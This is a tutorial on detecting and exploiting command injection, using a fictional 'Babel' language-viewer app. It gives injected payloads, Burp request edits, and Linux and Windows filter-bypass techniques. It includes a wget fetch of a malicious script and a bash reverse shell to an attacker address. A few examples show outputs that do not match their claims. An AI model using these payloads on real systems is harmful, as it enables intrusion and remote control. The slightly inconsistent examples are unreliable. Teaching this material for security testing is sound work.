# ðŸ‘€ Detection & Exploitation

**Command Injection** is a significant security vulnerability that enables an attacker to execute arbitrary commands on the underlying operating system through a compromised application. This flaw typically arises when user inputs are not adequately sanitized before being passed to a system shell.

### How Command Injection Works

When user input is mishandled, an attacker can manipulate that input to inject additional commands. The server may then execute these commands, potentially leading to data leaks, unauthorized access, or server compromises.

### Common Attack Vectors

Command injection vulnerabilities can emerge in several ways, including:

* **User Input Fields**: Accepting direct inputs from users, such as those found in forms.
* **URL Parameters**: Parameters embedded in URLs that lack proper sanitation.
* **API Calls**: APIs that execute commands based on user-supplied data.

#### Example Scenario: Babel's Language Viewer

Letâ€™s consider a **Language Viewer** application that allows users to view the contents of files associated with different languages. The application might execute commands similar to the following when given a language filename:

```bash
cat BABEL_INPUT
```

#### Crafting a Command Injection

An attacker could exploit this by injecting additional commands. For example:

```bash
cat /etc/babel_languages; ls -l
```

In this case, the attacker reads the contents of the `/etc/babel_languages` file, which contains language data, and then lists the contents of the current directory.

{% hint style="info" %}
**Good cheat-sheets are important** There are hundreds of command that could lead to command injections and we advise you go train with many types of injections, a good cheat-sheet would be [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) Or if you have an account, the `Hack the Box Command injection cheat-sheet` is a very valuable piece of content.
{% endhint %}

#### Bypassing Front-End Validation

Attackers can employ various techniques to bypass front-end validation and execute commands.

**Using the AND Operator**

For example, an attacker can combine commands using the AND operator:

```bash
cat /var/www/html/babel_intro.html && echo "Hello from Babel!"
```

If the first command succeeds, the attacker can execute a second command to write a message or even create a new file.

**Using the OR Operator**

If the application fails to sanitize input adequately, the attacker might try:

```bash
cat /var/www/html/babel_intro.html || ls -la
```

The `ls -la` command runs only if the first command fails. If the filename is incorrect, the attacker can still gather information about the directory contents.

#### Breaking the Input

To force the application to execute multiple commands regardless of success, the attacker can manipulate the input like this:

```bash
cat /dev/null; (sleep 5 && wget http://malicious.com/babel_script.sh)
```

In this example, the attacker uses a command to create a delay (`sleep 5`) before downloading a malicious script from an external server. This could allow the attacker to gain further access or deploy malware.

#### Using Subshells

A more sophisticated attack might use subshells to execute commands in a separate environment:

```bash
cat /etc/babel_languages; (bash -i >& /dev/tcp/babel_attacker_ip/4444 0>&1)
```

This command uses a reverse shell to connect back to an attackerâ€™s machine, allowing the attacker to execute arbitrary commands on the compromised system.

When testing for command injection vulnerabilities, you might observe or manipulate requests like the following in Burp Suite:

#### Initial Request

```bash
GET /language_viewer.php?filename=babel.txt HTTP/1.1
Host: babelsite.com
```

#### Injected Payload in Burp Suite

In the request editor, an attacker could modify the `filename` parameter to include their malicious payload:

```bash
GET /language_viewer.php?filename=babel.txt; ls -la HTTP/1.1
Host: babelsite.com
```

#### Output

Upon sending this modified request, the server might return a response with the output of the `ls -la` command if the application is vulnerable:

```bash
HTTP/1.1 200 OK
Content-Type: text/plain

babel_intro.txt
babel_advanced.txt
babel_malicious_script.sh
```

## Bypassing Blacklisted Characters & Commands

Command injection attempts often face security filters that block specific characters or sequences. However, attackers can use several techniques to bypass these restrictions and execute arbitrary commands. Below, we explore different techniques and examples of bypassing command blacklists, both on Linux and Windows systems.

### Linux Command Injection Techniques

#### Using Tabs Instead of Spaces

Both Linux and Windows systems accept commands with tabs (`%09`) instead of spaces. This can be useful when spaces are blacklisted by filters.

```bash
curl -X GET "http://example.com/api?host=babel_language%0a%09whoami"
# Output in Bash:
# babel-linux
```

#### Utilizing the `$BABEL_IFS` Environment Variable

In Linux, the `$BABEL_IFS` (Internal Field Separator) variable can be used as a space replacement, allowing commands to bypass space-based blacklists.

```bash
curl -X GET "http://example.com/api?host=babel_language%0a${BABEL_IFS}whoami"
# Output in Bash:
# babel-linux
```

#### Using Bash Brace Expansion

Bash Brace Expansion allows creating commands without spaces, which can bypass filters. This example uses it to list directory contents.

```bash
{ls,-la}
# Output in Bash:
# total 4
# drwxr-xr-x 2 babel babel 4096 Oct  6 10:12 babel_intro.txt
```

#### Exploiting Environment Variables to Inject Characters

You can extract specific characters from Linux environment variables like `${BABEL_PATH}` or `${BABEL_PWD}` to inject sequences into a command.

```bash
echo ${BABEL_PATH}
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

echo ${BABEL_PATH:0:1}
/  # Extracts the first character of the BABEL_PATH
```

#### Using URL Encoding Variants

When characters like `%0a` (newline) are blocked, you can try other URL-encoded forms, such as `%0d%0a`, to inject a newline and execute further commands.

```bash
curl -X GET "http://example.com/api?host=babel_language%0d%0awhoami"
```

#### Using Alternate Command Syntax

In scenarios where filters block commands or spaces, alternate syntax can help you bypass the restrictions and still run commands.

```bash
curl -X GET "http://example.com/api?host=babel_language; echo Success"
# Output in Bash:
# Success
```

#### Logical Operator Chaining

Chaining commands with logical operators (`&&`, `||`) allows attackers to run multiple commands even when spaces or some command sequences are filtered.

```bash
curl -X GET "http://example.com/api?host=babel_language&&echo BabelCheck"
# Output in Bash:
# BabelCheck
```

#### Producing Blacklisted Characters Using ASCII

You can bypass blacklists by creating characters like the backslash (`\`) indirectly. Here, we use the ASCII table and `tr` to shift characters:

```bash
echo $(tr '!-}' '"-~'<<<[)
/  # Produces the backslash by shifting the ASCII value
```

#### Ignoring Special Characters Using Quotes or Escape Characters

Certain characters, like quotes, are often ignored by shells like Bash, allowing you to bypass filters easily.

```bash
w'h'o'am'i
# Output in Bash:
# babel-linux

w"h"o"am"i
# Output in Bash:
# babel-linux
```

Backslashes (`\`) and positional parameters (`$@`) are similarly ignored by Bash and can be used without interfering with the commandâ€™s execution.

```bash
who$@ami
w\ho\am\i
# Output in Bash:
# babel-linux
```

#### Reversing Command Strings

Another technique is reversing command strings to bypass filters. The `rev` command in Linux can reverse the command, allowing you to execute it backward.

```bash
echo 'whoami' | rev
# Output in Bash:
# imahow

$(rev<<<'imahow')
# Output in Bash:
# babel-linux
```

#### Using Base64 Encoding for Commands

Base64 encoding is a powerful way to bypass filters. You can encode a command into Base64, then decode it on the fly to execute it.

```bash
echo -n 'ls /home/babel' | base64
# Output in Bash:
# bHMgL2hvbWUvYmFiZWw=

bash<<<$(base64 -d<<<bHMgL2hvbWUvYmFiZWw=)
# Output in Bash:
# example.txt  babel_config.sh
```

### Windows Command Injection Techniques

#### Manipulating Windows Environment Variables

In Windows, similar techniques can be applied. You can manipulate environment variables such as `%BABELPROFILE%` to extract characters and bypass filters.

```cmd
C:\> echo %BABELPROFILE:~3,-10%
\  # Extracts a backslash from the profile path
```

#### Using Caret (`^`) for Bypass

In Windows, the caret (`^`) can be used to escape or inject commands, which is especially useful when spaces or commands are blocked.

```cmd
who^ami
# Output in CMD:
# babel-win
```

#### Case

Sensitivity

Sometimes command injection can be bypassed by altering the case of commands. For example, changing `DIR` to `dir`.

```cmd
dir C:\
# Output in CMD:
# babel.txt  babel_config.txt
```

#### Using `CALL` Command

The `CALL` command in Windows allows executing commands indirectly, which can help bypass certain filters.

```cmd
CALL echo BabelSuccess
# Output in CMD:
# BabelSuccess
```

#### URL Encoding in Windows

Just like in Linux, URL encoding can also be effective in Windows environments. If certain characters are blacklisted, you can encode them.

```cmd
curl -X GET "http://example.com/api?host=babel_language%20%20%20&&echo WinBabel"
```
